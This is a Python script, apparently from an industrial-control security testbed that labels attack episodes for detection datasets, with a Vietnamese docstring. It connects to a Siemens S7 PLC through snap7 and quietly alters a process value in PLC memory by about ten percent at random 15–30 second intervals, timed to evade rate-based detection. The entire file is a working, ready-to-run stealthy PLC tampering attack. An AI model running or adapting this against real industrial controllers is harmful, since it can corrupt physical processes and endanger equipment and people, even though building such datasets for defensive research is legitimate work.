"""
STEALTHY_LOW_RATE_WRITE
Ghi nhe trong nguong hop le, sai thoi diem quy trinh.
Khong burst, khong flood — chi AI/context-aware moi detect.
Thay thay ews_firmware_tamper.py

Goi tu bash:
  python -m attacks_ext.stealthy_write \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
import random
from attacks_ext.config_ext import base_parser, write_label


def run(args):
    label_prefix = "STEALTHY_WRITE"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    import snap7
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import get_dint, set_dint

    client = snap7.client.Client()
    write_count = 0

    try:
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Connected. Stealthy low-rate write...")

        end_time = time.time() + args.duration
        while time.time() < end_time:
            try:
                cd1 = get_dint(client.read_area(Areas.MK, 0, 54, 4), 0)
            except Exception:
                cd1 = 0

            if cd1 > 0 and cd1 < 30000:
                new_val = int(cd1 * 1.10)
                if new_val > 30000:
                    new_val = int(cd1 * 0.90)
                buf = bytearray(4)
                set_dint(buf, 0, new_val)
                client.write_area(Areas.MK, 0, 54, buf)
                write_count += 1
                print(f"  [{write_count}] CD1 {cd1} -> {new_val}")
            elif write_count % 3 == 0:
                print(f"  [wait] CD1 idle, no stealthy window")

            time.sleep(random.uniform(15, 30))

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if client.get_connected():
            client.disconnect()
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"writes={write_count}")


def main():
    p = base_parser("Stealthy Low-Rate Write (Context-Aware)")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
